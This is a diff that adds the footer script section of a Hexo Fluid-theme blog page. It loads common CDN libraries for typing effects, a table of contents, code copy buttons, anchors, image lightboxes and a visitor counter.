+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
